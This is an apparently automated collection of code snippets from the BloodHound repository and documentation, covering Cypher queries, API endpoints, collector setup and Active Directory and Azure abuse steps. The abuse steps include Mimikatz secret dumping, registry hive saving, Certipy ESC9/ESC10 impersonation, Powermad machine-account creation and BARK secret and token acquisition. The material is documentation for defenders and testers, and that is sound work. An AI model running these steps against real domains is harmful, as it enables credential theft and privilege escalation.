https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_38\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V:Label)\nWHERE EXISTS {MATCH (V)-[E:EdgeLabel]->(T:TargetLabel) WHERE T.Property = 'target' return V}\nRETURN V\n```\n\n----------------------------------------\n\nTITLE: Single Depth Pattern Lookup in Cypher\nDESCRIPTION: This Cypher query demonstrates a low-cost single depth pattern lookup.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_14\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = (p2:Person)-[:WorksFor]->(:Company) where p2.name = \"Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Analyzing compstatus.csv with PowerShell\nDESCRIPTION: PowerShell commands to import and analyze the compstatus.csv file, including creating pivot tables for status and failures, identifying unreachable systems, and grouping systems by subnet.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/troubleshooting.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n### Import data and get uniques without sorting them\n$stats_file = Import-Csv -Path 'FILE_PATH_HERE' | Group-Object ComputerName, Task, Status, IPAddress | ForEach-Object { $_.Group[0] }\n\n### Status Pivot Table - Exclude GetMembersInAlias as it's irrelevant for troubleshooting\n$stats_file | Where-Object {$_.Task -NotLike 'GetMembersInAlias -*'} | Group-Object Task, Status -NoElement | Format-Table -Autosize\n\n### Pivot table for failures only\n$stats_file |  Where-Object {$_.Status -ne \"Success\"} | Group-Object Task,Status -NoElement | Format-Table -Autosize\n\n### Which systems were unreachable on 445/TCP\n$stats_file | Where-Object {$_.Task -eq \"ComputerAvailability\" -and $_.Status -eq \"PortNotOpen\"}\n\n### IPv4 /24 subnets unreachable on 445/TCP\n$stats_file | Where-Object {$_.Task -eq \"ComputerAvailability\" -and $_.Status -eq \"PortNotOpen\" -and $_.IPAddress -match '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'} | Group-Object {$_.IPAddress.Remove($_.IPAddress.LastIndexOf('.'))+'.0/24'} -NoElement | Sort-Object -property Count | Format-Table -Autosize\n\n### IPv4 /16 subnets unreachable on 445/TCP\n$stats_file | Where-Object {$_.Task -eq \"ComputerAvailability\" -and $_.Status -eq \"PortNotOpen\" -and $_.IPAddress -match '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'} | Group-Object {($_.IPAddress.split(\".\")[0..1] -join \".\") + \".0.0/16\"} -NoElement | Sort-Object -property Count | Format-Table -Autosize\n\n### Which systems are missing permissions\n$stats_file | Where-Object {$_.Status -eq \"ERROR_ACCESS_DENIED\" -or $_.Status -eq \"StatusAccessDenied\"}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Computer Account SID with PowerView\nDESCRIPTION: Uses PowerView to retrieve the Security Identifier (SID) of the newly created computer account. The SID is required for creating the Access Control Entry in the next step.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid\n```\n\n----------------------------------------\n\nTITLE: Saving Registry Hives for Offline Analysis\nDESCRIPTION: Commands to save SYSTEM and SECURITY registry hives for offline password extraction.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dump-smsa-password.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nreg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY\n```\n\n----------------------------------------\n\nTITLE: Windows GPLink Abuse Reference\nDESCRIPTION: The WriteGPLink permission can be abused on Windows using Powermad and PowerView tools to apply malicious GPOs to OUs. This requires domain-joined Windows machine access and proper DNS configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-gp-link.mdx#2025-04-23_snippet_0\n\n\n\n----------------------------------------\n\nTITLE: Querying User Group Membership with Cypher in BloodHound\nDESCRIPTION: A Cypher query that finds paths between User nodes and Group nodes using the MemberOf relationship, with a depth limit of 1 to 3 links. This query returns users that are members of groups up to three relationships away.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_1\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (n:User),(m:Group) MATCH p=(n)-[r:MemberOf*1..3]->(m) RETURN p\n```\n\n----------------------------------------\n\nTITLE: Listing Intune Script Execution Artifacts in Windows\nDESCRIPTION: These bash commands show the locations where Intune stores executed PowerShell scripts and their results on a Windows device. The scripts and results are temporarily stored in these locations but are deleted after execution.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-execute-command.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nC:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\nC:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Results\n```\n\n----------------------------------------\n\nTITLE: API Endpoint Definition for Completing File Upload in BloodHound\nDESCRIPTION: OpenAPI specification for the endpoint that marks a file upload job as complete. The endpoint requires a file_upload_job_id path parameter to identify which upload job to finalize.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collection-uploads/end-file-upload-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/file-upload/{file_upload_job_id}/end\n```\n\n----------------------------------------\n\nTITLE: Rendering Documentation Landing Page Layout in React/JSX\nDESCRIPTION: React/JSX component markup for the documentation landing page, including a hero section with search functionality and a grid of navigation cards for different documentation sections. Features styled components with gradients and responsive design.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/home.mdx#2025-04-23_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<div className=\"relative w-full flex items-center justify-center\" style={{ height: '24rem', overflow: 'hidden'}}>\n  <div\n    className=\"absolute inset-0\"\n    style={{\n      background: 'linear-gradient(to left, #2c2677 30%, #150f45 100%)',\n      opacity: 0.98\n    }}\n  ></div>\n  <div style={{ position: 'absolute', textAlign: 'center', padding: '0 1rem' }}>\n    <div\n      className=\"text-white dark:text-gray-200\"\n      style={{\n       fontWeight: '600',\n       fontSize: '28px',\n       margin: '0',\n      }}\n    >\n      Attack Paths For All\n    </div>\n\n    <p\n      className=\"prose text-white dark:prose-invert\"\n      style={{\n        marginTop: '1rem',\n       fontWeight: '400',\n       fontSize: '16px',\n       maxWidth: '42rem'\n      }}\n    >\n    <span style={{color: '#5465ff'}}>(b:BloodHoundUsers) - [h:Think_In] -> (e:Graphs)</span>\n    </p>\n    <div className=\"flex items-center justify-center\">\n    <button\n      type=\"button\"\n      className=\"hidden w-full lg:flex items-center text-sm leading-6 rounded-lg py-1.5 pl-2.5 pr-3 shadow-sm text-gray-400 dark:text-white/50 bg-white dark:bg-background-dark dark:brightness-[1.1] dark:ring-1 dark:hover:brightness-[1.25] ring-1 ring-gray-400/20 hover:ring-gray-600/25 dark:ring-gray-600/30 dark:hover:ring-gray-500/30 focus:outline-primary\"\n      id=\"home-search-entry\"\n      style={{\n        marginTop: '2rem',\n        maxWidth: '28rem',\n      }}\n      onClick={openSearch}\n    >\n      <svg\n        className=\"h-4 w-4 ml-1.5 flex-none bg-primary-light hover:bg-gray-600 dark:bg-white/50 dark:hover:bg-white/70\"\n        style={{\n        marginRight: '0.5rem',\n         maskImage:\n           'url(\"https://mintlify.b-cdn.net/v6.5.1/solid/magnifying-glass.svg\")',\n         maskRepeat: 'no-repeat',\n         maskPosition: 'center center',\n        }}\n      />\n\n      Search or ask\n    </button>\n    </div>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating a Machine Account with Powermad in PowerShell\nDESCRIPTION: Uses Kevin Robertson's Powermad project to create a new attacker-controlled computer account. This is useful when an attacker doesn't control an account with an SPN set, which is required for the Resource-Based Constrained Delegation attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nNew-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)\n```\n\n----------------------------------------\n\nTITLE: Setting Mail Attribute of Victim Computer Using ldapmodify in Linux\nDESCRIPTION: This command uses ldapmodify to set a dummy mail attribute for the victim computer in Linux environments, which may be required for certificate enrollment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Using Expansion with Range Literal in Cypher\nDESCRIPTION: This Cypher query demonstrates the use of expansion with a range literal, which incurs a higher cost.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_16\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = (p2:Person)-[:Knows *1]->(:Person) where p2.name = \"Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Using LDAP Filter with SharpHound\nDESCRIPTION: Command to limit SharpHound collection to objects matching a specific LDAP filter, in this case targeting a user with a specific display name.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_4\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --LDAPFilter \"(displayName=John Smith)\"\n```\n\n----------------------------------------\n\nTITLE: Adding New Owner to Service Principal using BARK in PowerShell\nDESCRIPTION: This code snippet shows how to use BARK's New-ServicePrincipalOwner function to add a new owner to a Service Principal by specifying the Service Principal Object ID, new owner Object ID, and the authentication token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-owner.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nNew-ServicePrincipalOwner `\n    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token\n```\n\n----------------------------------------\n\nTITLE: Acquiring a Token as the Service Principal in PowerShell\nDESCRIPTION: This snippet demonstrates how to use the newly created secret to acquire tokens as the service principal associated with the app using BARK's Get-MSGraphToken function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-secret.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\n$SPToken = Get-MSGraphToken `\n    -ClientID \"4d31...\" `\n    -ClientSecret \"odg8Q~...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: PowerShell gMSA Account Sensitivity Setting\nDESCRIPTION: PowerShell command showing how to check if a Group Managed Service Account (gMSA) is marked as sensitive and cannot be delegated. The account option is not visible in GUI for gMSA accounts but can be set through PowerShell.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/securing-bloodhound-and-collectors/sharphound-hardening.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-ADServiceAccount -Identity \"gMSA_account\" -Properties AccountNotDelegated\n```\n\n----------------------------------------\n\nTITLE: Fetching GUID for All Objects in PowerShell\nDESCRIPTION: This PowerShell snippet retrieves the GUID for all objects in the domain, which is typically '00000000-0000-0000-0000-000000000000'. It uses the Get-DomainGUIDMap function from PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/generic-all.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name\n```\n\n----------------------------------------\n\nTITLE: Restoring SPN of Victim Computer Using PowerView in Windows\nDESCRIPTION: This command uses PowerView to restore the original Service Principal Name (SPN) of the victim computer after the attack to avoid environmental issues.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}\n```\n\n----------------------------------------\n\nTITLE: Setting Computer Mail Attribute with ldapmodify in Linux\nDESCRIPTION: Uses ldapmodify to set a dummy mail attribute on the victim computer if required for certificate enrollment by the template configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: GET Endpoint for BloodHound Collector Downloads\nDESCRIPTION: OpenAPI endpoint specification for downloading BloodHound collector binaries based on collector type and release tag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/collectors/get-collector-download-by-version.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/collectors/{collector_type}/{release_tag}\n```\n\n----------------------------------------\n\nTITLE: Upgrading AzureHound on Kubernetes\nDESCRIPTION: Restarts the AzureHound deployment on Kubernetes to apply updates.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nkubectl rollout restart deployment/azurehound-deployment\n```\n\n----------------------------------------\n\nTITLE: Managing Certificate Template Enrollment Flags in PowerShell\nDESCRIPTION: PowerShell script to check and display msPKI-Enrollment-Flag values and their meanings from a certificate template. Includes comprehensive flag definitions and checking logic.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_13\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n$msPKICertificateNameFlag = $template.Properties[\"msPKI-Enrollment-Flag\"]\n$ldap.Close()\n\n# Print attribute value and enabeld flags\n$flagTable = @{\n0x00000001 = \"CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS\"\n0x00000002 = \"CT_FLAG_PEND_ALL_REQUESTS\"\n0x00000004 = \"CT_FLAG_PUBLISH_TO_KRA_CONTAINER\"\n0x00000008 = \"CT_FLAG_PUBLISH_TO_DS\"\n0x00000010 = \"CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE\"\n0x00000020 = \"CT_FLAG_AUTO_ENROLLMENT\"\n0x00000040 = \"CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT\"\n0x00000100 = \"CT_FLAG_USER_INTERACTION_REQUIRED\"\n0x00000400 = \"CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE\"\n0x00000800 = \"CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF\"\n0x00001000 = \"CT_FLAG_ADD_OCSP_NOCHECK\"\n0x00002000 = \"CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL\"\n0x00004000 = \"CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS\"\n0x00008000 = \"CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS\"\n0x00010000 = \"CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT\"\n0x00020000 = \"CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST\"\n0x00040000 = \"CT_FLAG_SKIP_AUTO_RENEWAL\"\n0x00080000 = \"CT_FLAG_NO_SECURITY_EXTENSION\"\n}\nWrite-Host \"msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag\"\nforeach ($flag in $flagTable.Keys) {\nif ($msPKICertificateNameFlag.ToString() -band $flag) {\nWrite-Host \"0x$(\"{0:X8}\" -f $flag) $($flagTable[$flag])\"\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes Generic Secret for AzureHound (No Passphrase)\nDESCRIPTION: Creates a Kubernetes generic secret for AzureHound Enterprise without a passphrase.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nkubectl create secret generic azurehound-secret --from-literal tokenId=<bloodhound enterprise token id> --from-literal token=<bloodhound enterprise token>\n```\n\n----------------------------------------\n\nTITLE: Using 'with' to Join Distinct Patterns in Cypher\nDESCRIPTION: This Cypher query uses the 'with' clause to join distinct patterns, which adds compounding weight to the query's cost in the analyzer's model due to multiple projections.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_9\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person)-[:WorksFor]->(:Company {name: \"thebigone.com\"}) with p as s match p = (s)-[:WorksFor]->(:Company {name: \"theotherone.net\"}) return p\n```\n\n----------------------------------------\n\nTITLE: Using Expansion with Greedy Range Literal in Cypher\nDESCRIPTION: This Cypher query shows the use of expansion with a greedy range literal, which incurs a higher cost.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_17\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = (p2:Person)-[:Knows *1..]->(:Person) where p2.name = \"Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Structuring Signed Request Headers for BloodHound API Authentication\nDESCRIPTION: Shows the header structure for using signed requests, the recommended authentication method for the BloodHound API. This method provides better security and is suitable for long-lived integrations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/overview.mdx#2025-04-23_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nAuthorization: bhesignature $TOKEN_ID\nRequestDate: $RFC3339_DATETIME\nSignature: $BASE64ENCODED_HMAC_SIGNATURE\n```\n\n----------------------------------------\n\nTITLE: Output of New-AppRegSecret Function in Azure\nDESCRIPTION: This snippet shows the output of the New-AppRegSecret function, which includes the plain-text secret value, the AppRegAppId, and the AppRegObjectId. These credentials can be used to authenticate as the service principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-secret.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nNew-AppRegSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token\n\nName              Value\n----              -----\nAppRegSecretValue odg8Q~...\nAppRegAppId       4d31...\nAppRegObjectId    d878...\n```\n\n----------------------------------------\n\nTITLE: Extracting sMSA Password with Mimikatz Commands\nDESCRIPTION: Series of Mimikatz commands to elevate privileges and dump LSA secrets containing sMSA passwords from a Windows system.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dump-smsa-password.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nprivilege::debug\ntoken::elevate\nlsadump::secrets\n```\n\n----------------------------------------\n\nTITLE: Disconnecting and Removing PowerShell Sessions\nDESCRIPTION: Demonstrates proper cleanup of PowerShell sessions by first disconnecting and then removing the session object to free resources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-ps-remote.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nDisconnect-PSSession -Session $session\nRemove-PSSession -Session $session\n```\n\n----------------------------------------\n\nTITLE: Targeted LAPS Password Access Configuration\nDESCRIPTION: Creates and applies an ACE that grants specific rights to read LAPS passwords for computer objects within a targeted OU.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/contains.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Removing GenericAll Permissions on Certificate Template in PowerShell\nDESCRIPTION: This PowerShell snippet removes the GenericAll permissions granted to a principal on a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_6\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$principalName = \"principal\" # SAM account name of principal\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Construct the ACE\n$account = New-Object System.Security.Principal.NTAccount($principalName)\n$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])\n$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(\n$sid,\n[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,\n[System.Security.AccessControl.AccessControlType]::Allow\n)\n\n# Remove the ACE from the ACL\n$acl = $template.psbase.ObjectSecurity\n$acl.RemoveAccessRuleSpecific($ace)\n$template.psbase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: BloodHound Development Environment Setup Commands\nDESCRIPTION: Commands to initialize and start the BloodHound development environment using the Just command runner. Includes initialization and development server startup commands.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/DEVREADME.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\njust init\njust bh-dev\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph JWT with Client Credentials in PowerShell\nDESCRIPTION: This snippet demonstrates how to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret using BARK's Get-MSGraphTokenWithClientCredentials function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-secret.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Configuring SharpHound Delegator Service Account\nDESCRIPTION: Command to reset the SharpHound Delegator service account configuration using sc.exe when the account settings are greyed out in the GUI. This allows modification of the service account through the service properties window.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/modify-service-account.mdx#2025-04-23_snippet_0\n\nLANGUAGE: batch\nCODE:\n```\nsc.exe config \"SHDelegator\" obj= \"localsystem\"\n```\n\n----------------------------------------\n\nTITLE: Merge Clause in Cypher\nDESCRIPTION: This Cypher query shows a merge clause, which is filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_22\n\nLANGUAGE: cypher\nCODE:\n```\nMERGE (StartLabel {Name: 'A'})-[E:EdgeLabel]->(EndLabel {Target: true}) RETURN E;\n```\n\n----------------------------------------\n\nTITLE: Delete Clauses in Cypher\nDESCRIPTION: These Cypher queries demonstrate delete clauses, which are filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_23\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V:Label) DELETE V;\nMATCH (V:Label) DETACH DELETE V;\n\nMATCH ()-[E:EdgeLabel]->() DELETE E;\n```\n\n----------------------------------------\n\nTITLE: Locating Intune Script Execution Logs in Windows\nDESCRIPTION: This bash command shows the location of the log file that contains a full copy of the executed PowerShell script contents. This log file is a permanent artifact unless tampered with by the attacker.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-execute-command.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nC:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\_IntuneManagementExtension.txt\n```\n\n----------------------------------------\n\nTITLE: Performing Kerberos Authentication (Linux)\nDESCRIPTION: Requests a ticket granting ticket (TGT) from the domain using the created certificate and specifying the IP of an affected DC.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx TARGET.pfx -dc-ip IP\n```\n\n----------------------------------------\n\nTITLE: Setting Computer dNSHostName with Certipy in Linux\nDESCRIPTION: Uses Certipy to change the dNSHostName attribute of the victim computer to match the targeted computer's dNSHostName.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns TARGET.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Setting dNSHostName of Victim Computer with Certipy in Linux\nDESCRIPTION: This command uses Certipy in Linux to update the dNSHostName attribute of the victim computer to match the target computer's hostname for the impersonation attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM$ -dns TARGET.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Checking Mail Attribute of Victim Computer Using PowerView\nDESCRIPTION: This command uses PowerView to check if the victim computer has the mail attribute set, which may be required for certificate enrollment depending on template configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainObject -Identity VICTIM -Properties mail\n```\n\n----------------------------------------\n\nTITLE: PUT Endpoint for Toggling BloodHound Features\nDESCRIPTION: Defines a REST API endpoint that allows enabling or disabling specific features by their ID. This endpoint uses the PUT HTTP method and requires a feature_id parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/config/toggle-a-feature-flags-enabled-status-to-either-enable-or-disable-it.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/features/{feature_id}/toggle\n```\n\n----------------------------------------\n\nTITLE: Adding a New Secret to a Target Azure App Registration in PowerShell\nDESCRIPTION: This snippet shows how to use BARK's New-AppRegSecret function to add a new secret to a target application using a previously acquired MS Graph token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-secret.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AppRegSecret `\n    -AppRegObjectID \"d878...\" `\n    -Token $MGToken.access_token\n```\n\n----------------------------------------\n\nTITLE: Resetting Victim's UPN (Linux)\nDESCRIPTION: Sets the UPN of the victim principal back to an arbitrary value using Certipy.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn victim@corp.local\n```\n\n----------------------------------------\n\nTITLE: Recursive Pattern Expansion Query in PostgreSQL\nDESCRIPTION: Recursive query component that extends paths by joining with the edge table, limited to depth 5 and excluding cycles.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_6\n\nLANGUAGE: postgresql\nCODE:\n```\nselect ex0.root_id,\n       e0.end_id,\n       ex0.depth + 1,\n       false,\n       e0.id = any (ex0.path),\n       ex0.path || e0.id\nfrom ex0\n         join edge e0 on e0.start_id = ex0.next_id\n         join node n1 on n1.id = e0.end_id\nwhere ex0.depth < 5\n  and not ex0.is_cycle\n```\n\n----------------------------------------\n\nTITLE: User Supplied Parameters in Cypher\nDESCRIPTION: This Cypher query shows the use of user-supplied parameters, which are filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_24\n\nLANGUAGE: cypher\nCODE:\n```\nCREATE (V:Label $MyParameter) RETURN 